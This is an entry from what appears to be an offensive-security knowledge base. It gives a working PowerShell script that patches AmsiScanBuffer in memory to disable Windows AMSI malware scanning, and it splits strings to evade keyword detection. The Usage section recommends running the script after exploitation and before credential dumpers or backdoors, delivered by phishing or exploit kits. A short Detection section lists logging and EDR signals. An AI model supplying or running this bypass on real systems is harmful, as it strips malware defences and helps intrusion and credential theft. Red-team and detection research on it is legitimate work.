---
id: b316fdbf-84f3-44c5-8af8-6c15c4c798bc
type: code
language: ps1
verified: true
created_at: '2023-04-06T03:56:25.894684+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - amsi-bypass
  - defense-evasion
  - patching
validated: true
---

# PowerShell-Patch-AmsiScanBuffer

## Code

```powershell
$Win32 = @"

using System;
using System.Runtime.InteropServices;

public class Win32 {

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

}
"@

Add-Type $Win32

$LoadLibrary = [Win32]::LoadLibrary("am" + "si.dll")
$Address = [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer")
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
```

## Description

This PowerShell script patches the AmsiScanBuffer function in amsi.dll by overwriting its first six bytes with a sequence that includes a MOV EAX, 0x80070057 (indicating failure) followed by a RET instruction (0xC3). This causes the function to return immediately without performing the actual malware scan, effectively disabling AMSI for the current process. It uses P/Invoke to call Win32 APIs for DLL loading, address retrieval, and memory protection changes. String concatenation evades simple keyword-based detection.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| None | This script has no user-substitutable variables; it targets the system-loaded amsi.dll directly. | N/A |

## Usage

Run this script in an elevated PowerShell session on a Windows target during post-exploitation to bypass AMSI before executing further malicious payloads, such as credential dumpers or backdoors. It can be delivered via initial access vectors like phishing or exploit kits. After execution, test with AMSI-triggering code to confirm bypass. Use in red team exercises to simulate advanced evasion tactics.

## Detection

- PowerShell ScriptBlock logging capturing P/Invoke to kernel32.dll functions like LoadLibrary and VirtualProtect.
- Sysmon Event ID 1 (Process Creation) for powershell.exe with suspicious arguments, or Event ID 8 (CreateRemoteThread) for memory operations.
- EDR alerts on memory writes to amsi.dll or anomalous API calls in PowerShell processes.
- Behavioral detection of failed AMSI scans followed by successful execution of known malicious patterns.

## Related

- [[procedures/Patch-AmsiScanBuffer-to-Bypass-AMSI]]
